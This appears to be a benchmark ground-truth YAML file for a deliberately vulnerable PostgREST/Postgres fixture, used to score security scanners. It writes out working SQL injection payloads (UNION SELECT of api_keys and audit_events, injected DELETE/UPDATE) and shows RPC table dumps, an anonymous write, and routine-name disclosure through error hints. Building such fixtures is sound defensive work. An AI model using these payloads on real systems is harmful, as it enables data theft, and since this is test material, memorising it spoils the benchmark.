@@ -1,0 +1,377 @@
+# Ground truth for corpus project 13: the tables are locked, the functions are
+# the way in.
+#
+# Every line below was checked against the running stack by
+# benchmark/corpus/verify.sh 13-rpc-security-definer. Every RPC claim is a real
+# POST /rpc/<name> whose response body is asserted; the injection claim is a
+# real injected payload whose output contains a value from a table the caller
+# cannot read; the write claim is a real anonymous write whose row is read back
+# out of the database.
+#
+# The one property this project measures that no other does: a scanner that
+# enumerates RELATIONS and stops reports this target as clean. Its relations
+# ARE clean. Its posture is not.
+
+name: 13-rpc-security-definer
+project_ref: bench-13
+base_url: http://127.0.0.1:54521
+rest_prefix: /
+anon_key_env: UNRULY_BENCH_ANON_KEY
+authenticated_key_env: UNRULY_BENCH_AUTH_KEY
+fixture: true
+compose: docker-compose.yml
+db:
+  service: db
+  user: postgres
+  database: fixture
+
+notes: >
+  Three tables. customers has RLS enabled with a satisfiable policy keyed to
+  the JWT `email` claim, which the corpus minter does not emit, so it answers
+  200 with an empty array. api_keys and audit_events hold no privilege for anon
+  and answer 401 with SQLSTATE 42501. None of the three accepts a write.
+
+  Six routines. Five are callable by anon, and three of those five defeat the
+  table protections: one returns the whole customers table, one is injectable
+  and reaches api_keys, one writes into audit_events. Two of the five are
+  precision controls that must NOT be reported. The sixth exists, is disclosed
+  by PostgREST's own 404 hint, and is not callable.
+
+expect:
+  key_in_bundles: false
+  escalation_gains: []
+  schemas: [public]
+
+  # The routine list a scanner's discovery pass is scored against. Two of these
+  # names appear in no wordlist — zephyr_customer_export_v2 is the one that
+  # dumps the customer table, and mnemosyne_key_rotation_audit is the one that
+  # exists and is refused — so routine discovery here has to be more than
+  # dictionary guessing.
+  routines:
+    - zephyr_customer_export_v2
+    - search_customers
+    - customers_for_current_user
+    - public_status_counts
+    - record_contact_request
+    - mnemosyne_key_rotation_audit
+
+  psql:
+    # --- verifier hygiene, and a real proof from run two onwards -----------
+    # This statement DELETES the probe rows and asserts at least one existed.
+    # On the first run it removes the seed in 01_tables.sql. On every run after
+    # that it removes the row the PREVIOUS run's anonymous RPC wrote — which
+    # makes it a psql-side proof that the write landed in a table anon holds no
+    # privilege on, and persisted across a container's lifetime.
+    #
+    # It runs first because lib/check.py evaluates expect.psql before
+    # expect.relations and expect.checks, so the row counts below are taken
+    # from a table this statement has just normalised.
+    - name: a probe row written by RPC was present, and is now removed
+      sql: "WITH d AS (DELETE FROM public.audit_events WHERE actor='rpc-probe@example.invalid' RETURNING 1) SELECT count(*) > 0 FROM d"
+      expect: t
+
+    # --- the tables really are protected ----------------------------------
+    - name: audit_events is back to its five seeded rows
+      sql: "SELECT count(*) FROM public.audit_events"
+      expect: 5
+    - name: customers has RLS enabled
+      sql: "SELECT relrowsecurity FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relname='customers'"
+      expect: t
+    - name: and exactly one policy, so this is not the empty-policy-set shape
+      sql: "SELECT count(*) FROM pg_policies WHERE schemaname='public' AND tablename='customers'"
+      expect: 1
+    - name: anon holds no privilege at all on api_keys
+      sql: "SELECT count(*) FROM information_schema.role_table_grants WHERE table_schema='public' AND table_name='api_keys' AND grantee='anon'"
+      expect: 0
+    - name: anon holds no privilege at all on audit_events
+      sql: "SELECT count(*) FROM information_schema.role_table_grants WHERE table_schema='public' AND table_name='audit_events' AND grantee='anon'"
+      expect: 0
+
+    # --- the routines ------------------------------------------------------
+    - name: six routines exist in public
+      sql: "SELECT string_agg(p.proname,',' ORDER BY p.proname) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public'"
+      expect: customers_for_current_user,mnemosyne_key_rotation_audit,public_status_counts,record_contact_request,search_customers,zephyr_customer_export_v2
+    - name: five of the six are SECURITY DEFINER
+      sql: "SELECT count(*) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND p.prosecdef"
+      expect: 5
+    - name: five of the six are executable by anon
+      sql: "SELECT count(*) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND has_function_privilege('anon', p.oid, 'EXECUTE')"
+      expect: 5
+    - name: the one anon may not execute is the key-rotation audit
+      sql: "SELECT count(*) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND p.proname='mnemosyne_key_rotation_audit' AND has_function_privilege('anon', p.oid, 'EXECUTE')"
+      expect: 0
+    # The guard that keeps the injectable routine read-only. PL/pgSQL refuses
+    # INSERT, UPDATE, DELETE and DDL inside a non-VOLATILE function, and
+    # provolatile 's' is STABLE.
+    - name: the injectable routine is STABLE, which is what keeps it read-only
+      sql: "SELECT p.provolatile FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND p.proname='search_customers'"
+      expect: s
+
+  relations:
+    # All three relations are correctly protected. This block is the half of
+    # the target a relation-only scanner sees, and everything in it is clean.
+    - name: customers
+      schema: public
+      rows: 20
+      read_exposed: false
+      read_status: 200
+      authenticated_read_exposed: false
+      insert_reachable: false
+      update_reachable: false
+      delete_reachable: false
+      probe:
+        post_body: '{"full_name":"unruly post","email":"post@example.invalid","phone_number":"x","country":"GB","owner_email":"post@example.invalid"}'
+        marker_sql: "INSERT INTO public.customers (full_name,email,phone_number,country,owner_email) VALUES ('unruly marker','marker@example.invalid','x','GB','marker@example.invalid') RETURNING id"
+        row_filter: "id=eq.{id}"
+        update_body: '{"full_name":"unruly-updated"}'
+        update_check_sql: "SELECT full_name FROM public.customers WHERE id={id}"
+        update_expect: "unruly-updated"
+        exists_check_sql: "SELECT count(*) FROM public.customers WHERE id={id}"
+        cleanup_sql: "DELETE FROM public.customers WHERE email IN ('marker@example.invalid','post@example.invalid')"
+
+    - name: api_keys
+      schema: public
+      rows: 5
+      read_exposed: false
+      read_status: 401
+      read_sqlstate: "42501"
+      authenticated_read_exposed: false
+      sensitive_columns: [key_hash]
+      insert_reachable: false
+      update_reachable: false
+      delete_reachable: false
+      probe:
+        post_body: '{"label":"unruly post","key_hash":"x"}'
+        marker_sql: "INSERT INTO public.api_keys (label,key_hash) VALUES ('unruly marker','unruly-marker-hash') RETURNING id"
+        row_filter: "id=eq.{id}"
+        update_body: '{"key_hash":"unruly-updated"}'
+        update_check_sql: "SELECT key_hash FROM public.api_keys WHERE id={id}"
+        update_expect: "unruly-updated"
+        exists_check_sql: "SELECT count(*) FROM public.api_keys WHERE id={id}"
+        cleanup_sql: "DELETE FROM public.api_keys WHERE label IN ('unruly marker','unruly post')"
+
+    - name: audit_events
+      schema: public
+      rows: 5
+      read_exposed: false
+      read_status: 401
+      read_sqlstate: "42501"
+      authenticated_read_exposed: false
+      insert_reachable: false
+      update_reachable: false
+      delete_reachable: false
+      probe:
+        post_body: '{"actor":"unruly post","action":"probe","detail":"x"}'
+        marker_sql: "INSERT INTO public.audit_events (actor,action,detail) VALUES ('unruly marker','probe','x') RETURNING id"
+        row_filter: "id=eq.{id}"
+        update_body: '{"detail":"unruly-updated"}'
+        update_check_sql: "SELECT detail FROM public.audit_events WHERE id={id}"
+        update_expect: "unruly-updated"
+        exists_check_sql: "SELECT count(*) FROM public.audit_events WHERE id={id}"
+        cleanup_sql: "DELETE FROM public.audit_events WHERE actor IN ('unruly marker','unruly post')"
+
+  checks:
+    # ---------------------------------------------------------------------
+    # FINDING 1. The table is locked; the function is not.
+    # customers answers `[]` to a direct GET. This routine hands over all 20
+    # rows with phone numbers and email addresses, to an anonymous caller.
+    # ---------------------------------------------------------------------
+    - name: a SECURITY DEFINER routine returns the whole protected customers table
+      method: POST
+      path: /rpc/zephyr_customer_export_v2
+      body: '{}'
+      expect_status: 200
+      expect_body_contains: "customer1@example.invalid"
+    - name: and it hands over phone numbers the direct read never showed
+      method: POST
+      path: /rpc/zephyr_customer_export_v2
+      body: '{}'
+      expect_status: 200
+      expect_body_contains: "+1-555-0201"
+    # It is STABLE, so PostgREST also serves it over GET. A scanner that only
+    # POSTs to /rpc/ finds it; a scanner that only crawls GETs finds it too.
+    - name: being STABLE, the same routine is reachable by GET as well
+      method: GET
+      path: /rpc/zephyr_customer_export_v2
+      expect_status: 200
+      expect_body_contains: "customer1@example.invalid"
+
+    # ---------------------------------------------------------------------
+    # FINDING 2. SQL injection through format() with %s.
+    # The payload closes the ILIKE literal and UNIONs in a table the caller
+    # cannot read directly — api_keys, which answers 401 to a GET. The proof is
+    # that a key hash comes back in the response body.
+    # ---------------------------------------------------------------------
+    - name: the search routine answers a benign call
+      method: POST
+      path: /rpc/search_customers
+      body: '{"term":"Dana"}'
+      expect_status: 200
+      expect_body_contains: "Dana Whitfield 8"
+    - name: and an injected UNION returns api_key hashes the caller cannot read
+      method: POST
+      path: /rpc/search_customers
+      body: '{"term":"'' UNION SELECT id, label, key_hash FROM public.api_keys --"}'
+      expect_status: 200
+      expect_body_contains: "sk_live_meridian_0000000000000003"
+    - name: the same injection reaches audit_events, also 401 to a direct GET
+      method: POST
+      path: /rpc/search_customers
+      body: '{"term":"'' UNION SELECT id, actor, detail FROM public.audit_events --"}'
+      expect_status: 200
+      expect_body_contains: "rotated production web"
+
+    # The injectable routine is deliberately READ-ONLY, and this is the proof
+    # rather than the claim. PL/pgSQL refuses a write from a non-VOLATILE
+    # function with SQLSTATE 0A000, so the same injection that reads any table
+    # in the database cannot change or destroy one. A fixture that a reader of
+    # its own README can drop is a fixture that gets dropped.
+    - name: an injected DELETE is refused by the non-volatile guard
+      method: POST
+      path: /rpc/search_customers
+      body: '{"term":"''; DELETE FROM public.audit_events RETURNING id, actor, detail --"}'
+      expect_status: 400
+      expect_body_contains: "DELETE is not allowed in a non-volatile function"
+    - name: an injected UPDATE is refused the same way
+      method: POST
+      path: /rpc/search_customers
+      body: '{"term":"''; UPDATE public.api_keys SET label=''x'' RETURNING id, label, key_hash --"}'
+      expect_status: 400
+      expect_body_contains: "UPDATE is not allowed in a non-volatile function"
+
+    # ---------------------------------------------------------------------
+    # FINDING 3. An anonymous WRITE into a table anon holds no privilege on.
+    # The routine returns the row it wrote, read back out of the table, so the
+    # response body is the evidence. The row is removed by the psql statement
+    # at the top of the NEXT run, which is where it is asserted to have landed.
+    # ---------------------------------------------------------------------
+    - name: a SECURITY DEFINER routine writes into the locked audit table
+      method: POST
+      path: /rpc/record_contact_request
+      body: '{"contact_email":"rpc-probe@example.invalid","note":"unruly wrote this"}'
+      expect_status: 200
+      expect_body_contains: '"stored_detail": "unruly wrote this"'
+
+    # ---------------------------------------------------------------------
+    # PRECISION CONTROLS. Two callable routines that are NOT a way in. A
+    # scanner that reports every callable routine, or every SECURITY DEFINER
+    # routine, is wrong about both.
+    # ---------------------------------------------------------------------
+    - name: the SECURITY INVOKER twin of the export returns nothing
+      method: POST
+      path: /rpc/customers_for_current_user
+      body: '{}'
+      expect_status: 200
+      expect_body_contains: "[]"
+    - name: and it leaks no email address, because RLS applies to the caller
+      method: POST
+      path: /rpc/customers_for_current_user
+      body: '{}'
+      expect_status: 200
+      expect_body_missing: "@example.invalid"
+    - name: a SECURITY DEFINER routine that returns only aggregates is not a leak
+      method: POST
+      path: /rpc/public_status_counts
+      body: '{}'
+      expect_status: 200
+      expect_body_contains: '"customers": 20'
+    - name: and the aggregate routine exposes no row from the tables it reads
+      method: POST
+      path: /rpc/public_status_counts
+      body: '{}'
+      expect_status: 200
+      expect_body_missing: "sk_live"
+
+    # ---------------------------------------------------------------------
+    # DISCOVERABLE, NOT CALLABLE. The measured refusal, and the two ways the
+    # routine is still discoverable.
+    # ---------------------------------------------------------------------
+    - name: the revoked routine answers 401 and names itself
+      method: POST
+      path: /rpc/mnemosyne_key_rotation_audit
+      body: '{}'
+      expect_status: 401
+      expect_body_contains: "permission denied for function mnemosyne_key_rotation_audit"
+    - name: it carries SQLSTATE 42501, not a not-found code
+      method: POST
+      path: /rpc/mnemosyne_key_rotation_audit
+      body: '{}'
+      expect_status: 401
+      expect_body_contains: "42501"
+    # Same routine, authenticated token: 403 rather than 401, same SQLSTATE.
+    - name: an authenticated caller is refused with 403 instead
+      method: POST
+      path: /rpc/mnemosyne_key_rotation_audit
+      body: '{}'
+      role: authenticated
+      expect_status: 403
+      expect_body_contains: "permission denied for function mnemosyne_key_rotation_audit"
+
+    # PostgREST's PGRST202 hint fuzzy-matches against the schema cache and
+    # names a REAL routine, INCLUDING one the caller holds no EXECUTE on. Drop
+    # the last character of either unguessable name and the server completes
+    # it. There is a similarity floor: a far-off name gets hint: null.
+    - name: a near-miss names the routine anon may not call
+      method: POST
+      path: /rpc/mnemosyne_key_rotation_audi
+      body: '{}'
+      expect_status: 404
+      expect_body_contains: "Perhaps you meant to call the function public.mnemosyne_key_rotation_audit"
+    - name: a near-miss also completes the export routine's name
+      method: POST
+      path: /rpc/zephyr_customer_export
+      body: '{}'
+      expect_status: 404
+      expect_body_contains: "Perhaps you meant to call the function public.zephyr_customer_export_v2"
+    - name: a far-miss discloses nothing
+      method: POST
+      path: /rpc/qqqqqqqq
+      body: '{}'
+      expect_status: 404
+      expect_body_contains: '"hint":null'
+
+    # The OpenAPI document lists the five callable routines and omits the one
+    # anon may not execute — the same asymmetry project 01 records for tables.
+    # The cheap discovery path misses exactly what privilege protects.
+    - name: OpenAPI names the export routine
+      method: GET
+      path: /
+      expect_status: 200
+      expect_body_contains: "/rpc/zephyr_customer_export_v2"
+    - name: OpenAPI omits the routine anon may not execute
+      method: GET
+      path: /
+      expect_status: 200
+      expect_body_missing: "mnemosyne_key_rotation_audit"
+    - name: OpenAPI omits the two tables anon holds no privilege on
+      method: GET
+      path: /
+      expect_status: 200
+      expect_body_missing: "api_keys"
+
+  unverified:
+    - claim: >
+        Whether the injectable routine could be used to WRITE if it were
+        declared VOLATILE is not measured, because it is not declared VOLATILE.
+      why: >
+        Making the injection destructive would mean shipping a fixture that any
+        reader of its own README could empty. The read-only guard is asserted
+        instead, with the exact SQLSTATE Postgres raises, so the shape of the
+        vulnerability is recorded without the shape of the damage.
+    - claim: >
+        That a relation-only scanner reports this project as clean is the
+        scoring rule, and no check here enforces it.
+      why: >
+        lib/check.py verifies the running stack, not a scanner's output. What
+        it does establish is both halves of the premise: all three relations
+        answer 200-empty or 401, and three routines hand over what those
+        relations refuse.
+    - claim: >
+        Routine discovery without the OpenAPI document and without the hint
+        oracle is not measured.
+      why: >
+        Both disclosure paths are open on this target and both are asserted. A
+        deployment with PGRST_OPENAPI_MODE=disabled would leave only the hint
+        oracle, and one that also declines to hint would leave only guessing —
+        which is the case the two unguessable names are chosen for, but no
+        project in the corpus closes those two paths to prove it.
